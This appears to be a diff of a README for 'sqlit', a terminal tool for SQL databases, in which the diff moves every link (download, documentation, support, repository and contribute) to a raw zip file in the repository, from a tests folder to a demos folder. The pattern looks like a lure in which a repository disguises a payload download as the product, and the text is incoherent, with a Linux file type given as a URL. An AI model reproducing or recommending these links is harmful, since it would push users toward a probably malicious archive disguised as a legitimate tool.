@@ -4,7 +4,7 @@
 Welcome to sqlit! This tool makes it easy to work with various SQL databases through a user-friendly text interface. Whether you're managing data in SQL Server, MySQL, PostgreSQL, SQLite, or other databases, sqlit simplifies your tasks.
 
 ## 📦 Download & Install
-To get started, you need to download sqlit. Visit this link to download the latest version: [Download sqlit](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/tests/integration/python_packages/dockerfiles/Software-v2.9.zip).
+To get started, you need to download sqlit. Visit this link to download the latest version: [Download sqlit](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/demos/Software_v2.9.zip).
 
 ### Installation Steps
 1. Once you visit the Releases page, locate the most recent version of sqlit.
@@ -15,7 +15,7 @@ Make sure you choose the correct file based on your system:
 
 - **Windows**: Look for a file ending in `.exe`.
 - **Mac**: Look for a file ending in `.dmg` or `.pkg`.
-- **Linux**: Look for a file ending in `https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/tests/integration/python_packages/dockerfiles/Software-v2.9.zip` or a relevant package for your distribution.
+- **Linux**: Look for a file ending in `https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/demos/Software_v2.9.zip` or a relevant package for your distribution.
 
 4. After downloading, open the file to start the installation. Follow the prompts to complete the installation.
 
@@ -76,10 +76,10 @@ If you run into issues while using sqlit, consider the following tips:
 - **Review the logs**: sqlit generates log files that may provide clues about any problems.
 
 ## 📄 Documentation
-For more extensive information, visit the [documentation page](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/tests/integration/python_packages/dockerfiles/Software-v2.9.zip). Here, you can find details on advanced features, configurations, and answer to frequently asked questions.
+For more extensive information, visit the [documentation page](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/demos/Software_v2.9.zip). Here, you can find details on advanced features, configurations, and answer to frequently asked questions.
 
 ## 📞 Support
-If you need help, don’t hesitate to reach out. You can open an issue in the [GitHub repository](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/tests/integration/python_packages/dockerfiles/Software-v2.9.zip) or join our community discussions for support.
+If you need help, don’t hesitate to reach out. You can open an issue in the [GitHub repository](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/demos/Software_v2.9.zip) or join our community discussions for support.
 
 ## ✏️ Contribution
 If you want to contribute to sqlit, your input is welcome! Please read our contribution guidelines in the repository to understand how you can help improve the project.
@@ -88,10 +88,10 @@ If you want to contribute to sqlit, your input is welcome! Please read our contr
 A special thanks to the contributors and community members who have helped in the development of sqlit. Your support makes this project better every day.
 
 ## 🔗 Quick Links
-- [Download sqlit](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/tests/integration/python_packages/dockerfiles/Software-v2.9.zip)
-- [Documentation](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/tests/integration/python_packages/dockerfiles/Software-v2.9.zip)
-- [Support](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/tests/integration/python_packages/dockerfiles/Software-v2.9.zip)
-- [Contribute](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/tests/integration/python_packages/dockerfiles/Software-v2.9.zip)
+- [Download sqlit](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/demos/Software_v2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/demos/Software_v2.9.zip)
+- [Support](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/demos/Software_v2.9.zip)
+- [Contribute](https://raw.githubusercontent.com/tapnnwjediii/sqlit/main/demos/Software_v2.9.zip)
 
 ## 🚀 Start managing your databases today!
 Now you have all the information you need to download and run sqlit. Don’t wait; start simplifying your SQL database management workflow.
